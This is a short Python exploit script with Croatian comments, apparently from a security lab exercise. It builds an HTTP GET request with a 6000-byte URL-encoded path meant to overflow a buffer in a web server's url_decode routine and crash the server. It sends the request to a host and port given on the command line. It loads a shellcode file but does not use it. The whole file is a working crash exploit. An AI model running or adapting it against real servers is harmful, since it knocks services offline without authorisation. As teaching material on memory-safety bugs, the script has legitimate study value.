#!/usr/bin/env python3
import sys
import socket
import traceback
import urllib.parse
import struct

####

stack_buffer = 0x34567890
stack_retaddr = 0x12345678

# KOMENTAR:

# Generira se payload koji nadilazi veličinu lokalnog buffera u url_decode
# Namjera je uzrokovati buffer overflow i srušiti poslužitelj
# Rušenje se događa jer se zapis pokušava obaviti na memorijsku lokaciju
# kojoj proces nema pristup (npr. izvan stack frame-a), a ne zato što je došlo do prepisivanja return adrese
# Ovo je osnovni test ranjivosti bez umetanja shellcode-a

def build_exploit(shellcode: bytes) -> bytes:
    payload = b"F" * 6000  # trbalo bi biti dovljno da preplavi buffer

    encoded_payload = urllib.parse.quote_from_bytes(payload).encode('ascii')

    request = b"GET /" + encoded_payload + b" HTTP/1.0\r\n\r\n"
    return request

####

def send_req(host: str, port: int, req: bytes) -> bytes:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting to %s:%d..." % (host, port))
    sock.connect((host, port))

    print("Connected, sending request...")
    sock.send(req)

    print("Request sent, waiting for reply...")
    rbuf = sock.recv(1024)
    resp = b""

    while len(rbuf):
        resp = resp + rbuf
        rbuf = sock.recv(1024)

    print("Received reply.")
    sock.close()
    return resp

####

if len(sys.argv) != 3:
    print("Usage: " + sys.argv[0] + " host port")
    exit()

try:
    shellfile = open("shellcode.bin", "rb")
    shellcode = shellfile.read()
    req = build_exploit(shellcode)
    print("HTTP request:")
    print(req)

    resp = send_req(sys.argv[1], int(sys.argv[2]), req)
    print("HTTP response:")
    print(resp)
except:
    print("Exception:")
    print(traceback.format_exc())


 
